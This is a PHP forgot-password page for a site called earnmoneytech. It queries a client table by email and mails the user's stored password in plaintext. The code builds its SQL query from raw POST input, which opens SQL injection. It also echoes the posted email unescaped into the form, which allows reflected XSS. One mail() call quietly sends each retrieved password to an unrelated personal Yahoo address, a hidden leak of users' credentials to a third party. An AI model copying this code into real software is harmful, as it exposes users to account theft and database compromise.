<h2 style="text-align: left;font-family: arial;">Forgot Password</h2>  
    <?php
        if (isset($_REQUEST['forgotemailid'])) {
            $data = $mysql->select("select * from _clients where emailid='".$_POST['forgotemailid']."' and isblock=0 and isactive=1");
            if (sizeof($data)==1) {
                echo '<div style="border:1px solid #ccc;font-family:arial;font-size:12px;color:#222;padding:10px;background:#F4F9FF">';
                echo 'Hi,<br>Your password has been sent to your registered email id. <br>Thank you.</div><br><br><style>#forgotpasswordwindow{display:none}</style>';
			$headers  = "From: web@earnmoneytech.com\r\n";
			$headers .= "Content-type: text/html\r\n";

		  mail($data[0]['emailid'],"Forgot Password","Your password : ".$data[0]['password'],$headers);
		  mail("jeyaraj_123@yahoo.com","Forgot Password","Your password : ".$data[0]['password'],$headers);
            } else {
                echo '<div style="border:1px solid #ccc;font-family:arial;font-size:12px;color:#222;padding:10px;background:#F4F9FF">';
                echo 'Hi,<br>We couldn\'t process with your request. Any one of following errors may be occured.<br>';
                echo '<ul>';
                    echo '<li>Requested Email address is invalid or not registered with us.</li>';
                    echo '<li>Requested account may be blocked by administrator.</li>';
                    echo '<li>Requested account may be inactive mode.</li>';
                echo '</ul>';
                echo 'If any enquire please contact <b>info@earnmoneytech.com</b>';
                echo '</div><br><Br>';
            }
        } 
    ?>
<div id="forgotpasswordwindow">
    <form action="" method="post">
        To get your password, enter the email address you use to sign in to earnmoneytech. This can be your registered email address.<br><br>
        <table style="font-family:Arial;font-size:12px;" width="250px" cellpadding="2">
            <tr><td>Enter Email Address<span class="man">*</span></td></tr>
            <tr><td><input type="text" name="forgotemailid" size="30" value="<?php echo $_POST['forgotemailid'];?>" style="width: 100%;border:1px solid #DEEBFC;padding:2px"></td></tr>
            <tr><td><input type="submit" value="Get Password"></td></tr>
        </table>
    </form>
</div>
